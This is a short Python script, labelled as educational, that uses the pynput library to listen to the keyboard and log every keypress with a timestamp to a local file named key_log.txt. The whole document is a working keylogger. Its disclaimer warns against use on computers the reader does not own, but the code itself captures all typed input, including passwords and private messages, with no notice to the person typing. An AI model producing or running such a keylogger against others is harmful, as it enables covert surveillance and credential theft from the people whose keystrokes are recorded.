# EDUCATIONAL USE ONLY
# This script demonstrates how system hooks work using pynput.
# Do not use on computers you do not own.

from pynput.keyboard import Key, Listener
import logging

# Set up logging to file
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), 
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

# Setup the listener
with Listener(on_press=on_press) as listener:
    listener.join()
